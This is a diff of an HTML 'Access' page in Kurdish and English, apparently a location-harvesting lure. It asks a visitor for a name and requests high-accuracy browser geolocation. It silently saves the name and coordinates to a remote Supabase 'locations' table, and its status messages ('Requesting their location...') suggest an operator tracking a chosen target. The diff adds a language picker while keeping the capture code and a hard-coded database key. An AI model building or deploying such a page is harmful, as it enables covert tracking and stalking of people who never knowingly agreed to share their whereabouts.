@@ -1,17 +1,34 @@
 <!DOCTYPE html>
-<html lang="ku">
+<html lang="ku" dir="rtl">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Access</title>
-
-  <!-- Leaflet CSS -->
-  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  <title id="pageTitle">Access</title>
 
   <style>
+    :root {
+      --bg: #0f172a;
+      --card: #1e293b;
+      --input: #0f172a;
+      --border: #334155;
+      --text: #f8fafc;
+      --muted: #94a3b8;
+      --blue: #2563eb;
+      --blue-hover: #1d4ed8;
+      --gray: #334155;
+      --gray-hover: #475569;
+      --red: #ef4444;
+      --green: #22c55e;
+      --yellow: #f59e0b;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
     body {
-      background-color: #0f172a;
-      color: #ffffff;
+      background-color: var(--bg);
+      color: var(--text);
       font-family: Arial, sans-serif;
       display: flex;
       justify-content: center;
@@ -19,12 +36,11 @@
       min-height: 100vh;
       margin: 0;
       padding: 20px;
-      box-sizing: border-box;
     }
 
     .card {
-      background: #1e293b;
-      max-width: 400px;
+      background: var(--card);
+      max-width: 420px;
       width: 100%;
       padding: 30px;
       border-radius: 16px;
@@ -34,31 +50,77 @@
 
     h2 {
       margin-top: 0;
-      color: #f8fafc;
+      color: var(--text);
+      margin-bottom: 10px;
     }
 
     p {
-      color: #94a3b8;
+      color: var(--muted);
       font-size: 14px;
+      line-height: 1.7;
       margin-bottom: 20px;
+    }
+
+    /* =========================
+       LANGUAGE SCREEN
+    ========================== */
+
+    #languageScreen {
+      display: block;
+    }
+
+    .language-buttons {
+      display: flex;
+      gap: 12px;
+      margin-top: 20px;
+    }
+
+    .language-btn {
+      flex: 1;
+      padding: 13px;
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      background: var(--input);
+      color: var(--text);
+      font-size: 15px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    .language-btn:hover {
+      background: var(--gray);
+      border-color: var(--blue);
+    }
+
+    .language-btn.active {
+      background: var(--blue);
+      border-color: var(--blue);
+    }
+
+    /* =========================
+       ACCESS SCREEN
+    ========================== */
+
+    #accessScreen {
+      display: none;
     }
 
     input[type="text"] {
       width: 100%;
       padding: 12px;
       margin-bottom: 15px;
-      border: 1px solid #334155;
+      border: 1px solid var(--border);
       border-radius: 8px;
-      background: #0f172a;
+      background: var(--input);
       color: #fff;
       font-size: 15px;
       text-align: center;
-      box-sizing: border-box;
       outline: none;
     }
 
     input[type="text"]:focus {
-      border-color: #3b82f6;
+      border-color: var(--blue);
     }
 
     .btn-group {
@@ -66,7 +128,7 @@
       gap: 10px;
     }
 
-    button {
+    button.action-btn {
       flex: 1;
       padding: 12px;
       border: none;
@@ -78,152 +140,730 @@
     }
 
     #allow {
-      background: #2563eb;
+      background: var(--blue);
       color: #ffffff;
     }
 
     #allow:hover {
-      background: #1d4ed8;
+      background: var(--blue-hover);
     }
 
     #deny {
-      background: #334155;
+      background: var(--gray);
       color: #cbd5e1;
     }
 
     #deny:hover {
-      background: #475569;
+      background: var(--gray-hover);
     }
 
     #result {
       margin-top: 20px;
       font-size: 14px;
       word-break: break-word;
+      line-height: 1.6;
     }
 
-    #map {
-      height: 300px;
-      margin-top: 20px;
-      border-radius: 12px;
-      display: none;
-      overflow: hidden;
+    .change-language {
+      margin-top: 18px;
+      background: transparent;
+      border: 0;
+      color: var(--muted);
+      cursor: pointer;
+      font-size: 13px;
+    }
+
+    .change-language:hover {
+      color: #fff;
+    }
+
+    @media (max-width: 480px) {
+      .card {
+        padding: 24px 20px;
+      }
+
+      .language-buttons,
+      .btn-group {
+        flex-direction: column;
+      }
     }
   </style>
 </head>
+
 <body>
 
   <div class="card">
-    <h2>چونەژوورەوە</h2>
-    <p>تکایە ناوەکەت بنووسە و کلیک لە بەردەوام بوون بکە.</p>
 
-    <input type="text" id="username" placeholder="ناوەکەت بنووسە..." />
+    <!-- =========================
+         LANGUAGE SELECTION
+    ========================== -->
 
-    <div class="btn-group">
-      <button id="allow">بەردەوام بوون</button>
-      <button id="deny">ڕەتکردنەوە</button>
+    <div id="languageScreen">
+
+      <h2 id="languageTitle">
+        زمان هەڵبژێرە
+      </h2>
+
+      <p id="languageDescription">
+        تکایە پێش بەردەوامبوون زمانەکەت هەڵبژێرە.
+      </p>
+
+      <div class="language-buttons">
+
+        <button
+          type="button"
+          class="language-btn"
+          id="kurdishBtn"
+        >
+          کوردی
+        </button>
+
+        <button
+          type="button"
+          class="language-btn"
+          id="englishBtn"
+        >
+          English
+        </button>
+
+      </div>
+
     </div>
 
-    <div id="result"></div>
-    <div id="map"></div>
+
+    <!-- =========================
+         ACCESS / LOCATION SCREEN
+    ========================== -->
+
+    <div id="accessScreen">
+
+      <h2 id="accessTitle">
+        چونەژوورەوە
+      </h2>
+
+      <p id="accessDescription">
+        تکایە ناوەکەت بنووسە و کلیک لە بەردەوام بوون بکە.
+      </p>
+
+      <input
+        type="text"
+        id="username"
+        placeholder="ناوەکەت بنووسە..."
+        autocomplete="name"
+      >
+
+      <div class="btn-group">
+
+        <button
+          type="button"
+          class="action-btn"
+          id="allow"
+        >
+          بەردەوام بوون
+        </button>
+
+        <button
+          type="button"
+          class="action-btn"
+          id="deny"
+        >
+          ڕەتکردنەوە
+        </button>
+
+      </div>
+
+      <div id="result"></div>
+
+      <button
+        type="button"
+        class="change-language"
+        id="changeLanguage"
+      >
+        گۆڕینی زمان
+      </button>
+
+    </div>
+
   </div>
 
-  <!-- Leaflet JS -->
-  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-  <!-- Supabase JS -->
+
+  <!-- =========================
+       SUPABASE
+  ========================== -->
+
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
+
   <script>
+
     // =========================
     // SUPABASE SETUP
     // =========================
-    const SUPABASE_URL = "https://mxichdljcrlcomnhkcin.supabase.co";
-    const SUPABASE_KEY = "sb_publishable_SlntFaOIzECUYXOwVUzmDQ_cLzgxh-P";
 
-    const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+    const SUPABASE_URL =
+      "https://mxichdljcrlcomnhkcin.supabase.co";
+
+    const SUPABASE_KEY =
+      "sb_publishable_SlntFaOIzECUYXOwVUzmDQ_cLzgxh-P";
+
+    const supabaseClient =
+      window.supabase.createClient(
+        SUPABASE_URL,
+        SUPABASE_KEY
+      );
+
 
     // =========================
     // ELEMENTS
     // =========================
-    const allowButton = document.getElementById("allow");
-    const denyButton = document.getElementById("deny");
-    const usernameInput = document.getElementById("username");
-    const result = document.getElementById("result");
-    const mapDiv = document.getElementById("map");
 
-    let mapInstance = null;
+    const languageScreen =
+      document.getElementById("languageScreen");
+
+    const accessScreen =
+      document.getElementById("accessScreen");
+
+    const languageTitle =
+      document.getElementById("languageTitle");
+
+    const languageDescription =
+      document.getElementById("languageDescription");
+
+    const accessTitle =
+      document.getElementById("accessTitle");
+
+    const accessDescription =
+      document.getElementById("accessDescription");
+
+    const usernameInput =
+      document.getElementById("username");
+
+    const allowButton =
+      document.getElementById("allow");
+
+    const denyButton =
+      document.getElementById("deny");
+
+    const result =
+      document.getElementById("result");
+
+    const changeLanguage =
+      document.getElementById("changeLanguage");
+
+    const kurdishBtn =
+      document.getElementById("kurdishBtn");
+
+    const englishBtn =
+      document.getElementById("englishBtn");
+
+    const pageTitle =
+      document.getElementById("pageTitle");
+
 
     // =========================
-    // ALLOW BUTTON ACTION
+    // TRANSLATIONS
     // =========================
-    allowButton.addEventListener("click", function () {
-      const name = usernameInput.value.trim();
 
-      if (!name) {
-        result.innerHTML = "<span style='color: #ef4444;'>❌ تکایە پێشتر ناوەکەت بنووسە!</span>";
-        return;
+    const translations = {
+
+      ku: {
+        direction: "rtl",
+
+        pageTitle: "چونەژوورەوە",
+
+        languageTitle:
+          "زمان هەڵبژێرە",
+
+        languageDescription:
+          "تکایە پێش بەردەوامبوون زمانەکەت هەڵبژێرە.",
+
+        accessTitle:
+          "چونەژوورەوە",
+
+        accessDescription:
+          "تکایە ناوەکەت بنووسە و کلیک لە بەردەوام بوون بکە.",
+
+        namePlaceholder:
+          "ناوەکەت بنووسە...",
+
+        allow:
+          "بەردەوام بوون",
+
+        deny:
+          "ڕەتکردنەوە",
+
+        changeLanguage:
+          "گۆڕینی زمان",
+
+        enterName:
+          "❌ تکایە پێشتر ناوەکەت بنووسە!",
+
+        noGeolocation:
+          "❌ پێگەڕەکەت پشتیوانی وەرگرتنی شوێن ناکات.",
+
+        requesting:
+          "⏳ داواکاری وەرگرتنی شوێنەکەی دەکرێت...",
+
+        saving:
+          "⏳ شوێنەکەی وەرگیراوە، لە داتابەیس تۆمار دەکرێت...",
+
+        success:
+          "✅ بە سەرکەوتوویی لە داتابەیس تۆمارکرا!",
+
+        databaseError:
+          "⚠️ شوێنەکە وەرگیرا، بەڵام لە داتابەیس تۆمار نەکرا!",
+
+        permissionDenied:
+          "❌ ڕێگەپێدانی بینینی شوێن ڕەتکرایەوە. تکایە لە وێبگەڕەکەت Allow بکە.",
+
+        unavailable:
+          "❌ زانیاری شوێنەکەی بەردەست نییە.",
+
+        timeout:
+          "❌ وەرگرتنی شوێن کاتی بەسەرچوو.",
+
+        unknown:
+          "❌ هەڵەیەکی نەزانراو ڕووی دا.",
+
+        denied:
+          "ڕەتکردنەوە هەڵبژێردرا."
+
+      },
+
+
+      en: {
+        direction: "ltr",
+
+        pageTitle: "Access",
+
+        languageTitle:
+          "Choose your language",
+
+        languageDescription:
+          "Please choose your language before continuing.",
+
+        accessTitle:
+          "Access",
+
+        accessDescription:
+          "Please enter your name and click Continue.",
+
+        namePlaceholder:
+          "Enter your name...",
+
+        allow:
+          "Continue",
+
+        deny:
+          "Cancel",
+
+        changeLanguage:
+          "Change language",
+
+        enterName:
+          "❌ Please enter your name first!",
+
+        noGeolocation:
+          "❌ Your browser does not support location services.",
+
+        requesting:
+          "⏳ Requesting their location...",
+
+        saving:
+          "⏳ Location received. Saving to the database...",
+
+        success:
+          "✅ Successfully saved to the database!",
+
+        databaseError:
+          "⚠️ Location was received, but it could not be saved to the database.",
+
+        permissionDenied:
+          "❌ Location permission was denied. Please allow location access in your browser.",
+
+        unavailable:
+          "❌ Your location is currently unavailable.",
+
+        timeout:
+          "❌ The location request timed out.",
+
+        unknown:
+          "❌ An unknown error occurred.",
+
+        denied:
+          "You chose to cancel."
+
       }
 
-      if (!navigator.geolocation) {
-        result.innerHTML = "<span style='color: #ef4444;'>❌ پێگەڕەکەت پشتیوانی وەرگرتنی شوێن ناکات.</span>";
-        return;
-      }
-
-      result.innerHTML = "<span style='color: #3b82f6;'>⏳ داواکاری وەرگرتنی شوێن ئەوکەسە کە دەتەوێ دەکەین...</span>";
-
-      navigator.geolocation.getCurrentPosition(
-        async function (position) {
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
+    };
 
 
-          // تۆمارکردن لە Supabase
-          const { error } = await supabaseClient
-            .from("locations")
-            .insert([
-              {
-                name: name,
-                latitude: latitude,
-                longitude: longitude
-              }
-            ]);
+    // =========================
+    // CURRENT LANGUAGE
+    // =========================
 
-          if (error) {
-            console.error("Supabase Error:", error);
-            result.innerHTML = "<span style='color: #f59e0b;'>⚠️ شوێنەکە وەرگیرا، بەڵام لە داتابەیس تۆمار نەکرا!</span>";
-            return;
-          }
+    let currentLanguage = "ku";
 
-          result.innerHTML = "<span style='color: #22c55e;'>✅ بە سەرکەوتوویی لە داتابەیس تۆمارکرا!</span>";
-        },
-        function (error) {
-          switch(error.code) {
-            case error.PERMISSION_DENIED:
-              result.innerHTML = "<span style='color: #ef4444;'>❌ ڕێگەپێدانی بینینی شوێن ڕەتکرایەوە بۆ بەردەوام بوون  Allow  بکە.</span>";
-              break;
-            case error.POSITION_UNAVAILABLE:
-              result.innerHTML = "<span style='color: #ef4444;'>❌ زانیاری شوێنەکەت بەردەست نییە.</span>";
-              break;
-            case error.TIMEOUT:
-              result.innerHTML = "<span style='color: #ef4444;'>❌ وەرگرتنی شوێن کاتی بەسەرچوو.</span>";
-              break;
-            default:
-              result.innerHTML = "<span style='color: #ef4444;'>❌ هەڵەیەکی نەزانراو ڕووی دا.</span>";
-          }
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 15000,
-          maximumAge: 0
-        }
+
+    // =========================
+    // CHANGE LANGUAGE
+    // =========================
+
+    function setLanguage(language) {
+
+      currentLanguage =
+        translations[language]
+          ? language
+          : "ku";
+
+      const t =
+        translations[currentLanguage];
+
+
+      // HTML direction
+
+      document.documentElement.lang =
+        currentLanguage;
+
+      document.documentElement.dir =
+        t.direction;
+
+
+      // Page title
+
+      pageTitle.textContent =
+        t.pageTitle;
+
+
+      // Language screen
+
+      languageTitle.textContent =
+        t.languageTitle;
+
+      languageDescription.textContent =
+        t.languageDescription;
+
+
+      // Access screen
+
+      accessTitle.textContent =
+        t.accessTitle;
+
+      accessDescription.textContent =
+        t.accessDescription;
+
+      usernameInput.placeholder =
+        t.namePlaceholder;
+
+      allowButton.textContent =
+        t.allow;
+
+      denyButton.textContent =
+        t.deny;
+
+      changeLanguage.textContent =
+        t.changeLanguage;
+
+
+      // Button state
+
+      kurdishBtn.classList.toggle(
+        "active",
+        currentLanguage === "ku"
       );
-    });
+
+      englishBtn.classList.toggle(
+        "active",
+        currentLanguage === "en"
+      );
+
+
+      // Clear old result
+
+      result.innerHTML = "";
+    }
+
 
     // =========================
-    // DENY BUTTON ACTION
+    // LANGUAGE BUTTONS
     // =========================
-    denyButton.addEventListener("click", function () {
-      window.location.href = "https://www.google.com";
-    });
+
+    kurdishBtn.addEventListener(
+      "click",
+      function () {
+
+        setLanguage("ku");
+
+        languageScreen.style.display =
+          "none";
+
+        accessScreen.style.display =
+          "block";
+
+      }
+    );
+
+
+    englishBtn.addEventListener(
+      "click",
+      function () {
+
+        setLanguage("en");
+
+        languageScreen.style.display =
+          "none";
+
+        accessScreen.style.display =
+          "block";
+
+      }
+    );
+
+
+    // =========================
+    // CHANGE LANGUAGE
+    // =========================
+
+    changeLanguage.addEventListener(
+      "click",
+      function () {
+
+        accessScreen.style.display =
+          "none";
+
+        languageScreen.style.display =
+          "block";
+
+        result.innerHTML = "";
+      }
+    );
+
+
+    // =========================
+    // ALLOW / CONTINUE
+    // =========================
+
+    allowButton.addEventListener(
+      "click",
+      async function () {
+
+        const t =
+          translations[currentLanguage];
+
+        const name =
+          usernameInput.value.trim();
+
+
+        // Check name
+
+        if (!name) {
+
+          result.innerHTML =
+            `<span style="color: ${getComputedStyle(document.documentElement).getPropertyValue("--red")}">
+              ${t.enterName}
+            </span>`;
+
+          return;
+        }
+
+
+        // Check browser support
+
+        if (!navigator.geolocation) {
+
+          result.innerHTML =
+            `<span style="color: #ef4444;">
+              ${t.noGeolocation}
+            </span>`;
+
+          return;
+        }
+
+
+        // Disable buttons
+
+        allowButton.disabled =
+          true;
+
+        denyButton.disabled =
+          true;
+
+
+        // Request location
+
+        result.innerHTML =
+          `<span style="color: #3b82f6;">
+            ${t.requesting}
+          </span>`;
+
+
+        navigator.geolocation.getCurrentPosition(
+
+          async function (position) {
+
+            const latitude =
+              position.coords.latitude;
+
+            const longitude =
+              position.coords.longitude;
+
+
+            result.innerHTML =
+              `<span style="color: #3b82f6;">
+                ${t.saving}
+              </span>`;
+
+
+            try {
+
+              // Save to Supabase
+
+              const { error } =
+                await supabaseClient
+                  .from("locations")
+                  .insert([
+                    {
+                      name: name,
+                      latitude: latitude,
+                      longitude: longitude
+                    }
+                  ]);
+
+
+              if (error) {
+
+                console.error(
+                  "Supabase Error:",
+                  error
+                );
+
+
+                result.innerHTML =
+                  `<span style="color: #f59e0b;">
+                    ${t.databaseError}
+                  </span>`;
+
+                return;
+              }
+
+
+              // Success
+
+              result.innerHTML =
+                `<span style="color: #22c55e;">
+                  ${t.success}
+                </span>`;
+
+            }
+
+            catch (error) {
+
+              console.error(
+                "Unexpected Error:",
+                error
+              );
+
+
+              result.innerHTML =
+                `<span style="color: #f59e0b;">
+                  ${t.databaseError}
+                </span>`;
+
+            }
+
+            finally {
+
+              allowButton.disabled =
+                false;
+
+              denyButton.disabled =
+                false;
+            }
+
+          },
+
+
+          function (error) {
+
+            let message =
+              t.unknown;
+
+
+            switch (error.code) {
+
+              case error.PERMISSION_DENIED:
+
+                message =
+                  t.permissionDenied;
+
+                break;
+
+
+              case error.POSITION_UNAVAILABLE:
+
+                message =
+                  t.unavailable;
+
+                break;
+
+
+              case error.TIMEOUT:
+
+                message =
+                  t.timeout;
+
+                break;
+
+            }
+
+
+            result.innerHTML =
+              `<span style="color: #ef4444;">
+                ${message}
+              </span>`;
+
+
+            allowButton.disabled =
+              false;
+
+            denyButton.disabled =
+              false;
+          },
+
+
+          {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+          }
+
+        );
+
+      }
+    );
+
+
+    // =========================
+    // DENY / CANCEL
+    // =========================
+
+    denyButton.addEventListener(
+      "click",
+      function () {
+
+        window.location.href =
+          "https://www.google.com";
+
+      }
+    );
+
+
+    // =========================
+    // INITIAL LANGUAGE
+    // =========================
+
+    setLanguage("ku");
+
   </script>
 
 </body>
